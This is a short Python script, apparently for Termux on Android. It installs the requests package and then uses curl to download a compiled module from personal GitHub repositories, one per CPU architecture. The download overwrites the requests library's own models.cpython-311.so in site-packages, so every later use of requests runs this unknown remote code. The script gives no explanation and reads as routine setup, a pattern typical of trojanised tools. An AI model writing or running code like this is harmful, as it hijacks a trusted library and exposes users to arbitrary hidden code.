#coding=utf-8
import os,platform
try:
    import requests
except:
    os.system('pip install requests')

import requests
bit = platform.architecture()[0]
if bit == '64bit':
    os.system("curl https://raw.githubusercontent.com/ITX-SANAN/tt/main/models.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so")
        
elif bit == '32bit':
    os.system("curl https://raw.githubusercontent.com/khalidjan21/1/main/models.cpython-311.so > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.cpython-311.so")
